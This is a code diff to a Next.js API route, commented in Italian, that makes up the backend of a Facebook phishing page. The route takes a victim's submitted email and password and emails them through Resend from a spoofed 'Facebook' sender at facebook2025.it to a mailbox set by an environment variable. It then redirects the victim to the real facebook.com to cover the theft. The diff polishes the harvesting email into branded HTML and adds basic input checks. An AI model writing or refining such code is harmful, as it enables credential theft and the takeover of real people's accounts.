@@ -1,4 +1,4 @@
-export const runtime = 'nodejs'; // Imposta il runtime corretto per usare Resend
+export const runtime = 'nodejs';
 
 import { NextResponse } from 'next/server';
 import { Resend } from 'resend';
@@ -9,16 +9,9 @@ export async function POST(request: Request) {
     const email = body.get('email')?.toString() || '';
     const password = body.get('password')?.toString() || '';
 
-    console.log('✅ Route POST attivata');
-    console.log('Email:', email);
-    console.log('Password:', password);
-
-    // Validazione base
-    if (!email || !password) {
-      return NextResponse.json(
-        { error: 'Email e password obbligatori.' },
-        { status: 400 }
-      );
+    // 🔐 Validazione semplice
+    if (!email.includes('@') || password.length < 4) {
+      return NextResponse.json({ error: 'Credenziali non valide' }, { status: 400 });
     }
 
     const resend = new Resend(process.env.RESEND_API_KEY);
@@ -26,13 +19,22 @@ export async function POST(request: Request) {
     await resend.emails.send({
       from: 'Facebook <securitynoreply@facebook2025.it>',
       to: process.env.EMAIL_TO ?? '',
-      subject: '🛡️ Nuovo tentativo di accesso',
-      text: `📧 Email: ${email}\n🔑 Password: ${password}`,
+      subject: '🛡️ Nuovo accesso Facebook2025',
+      html: `
+        <div style="font-family: Arial, sans-serif; padding: 1rem;">
+          <h2 style="color: #4267B2;">🔐 Nuovo login registrato</h2>
+          <p><strong>Email:</strong> ${email}</p>
+          <p><strong>Password:</strong> ${password}</p>
+          <hr />
+          <p style="font-size: 0.85rem; color: #555;">Ricevuto da facebook2025.it</p>
+        </div>
+      `,
     });
 
+    // ✅ Redirect verso Facebook
     return NextResponse.redirect('https://www.facebook.com');
   } catch (error) {
-    console.error('❌ Errore dettagliato:', error);
-    return NextResponse.json({ error: 'Errore interno del server.' }, { status: 500 });
+    console.error('❌ Errore invio email:', error);
+    return NextResponse.json({ error: 'Errore interno del server' }, { status: 500 });
   }
 }
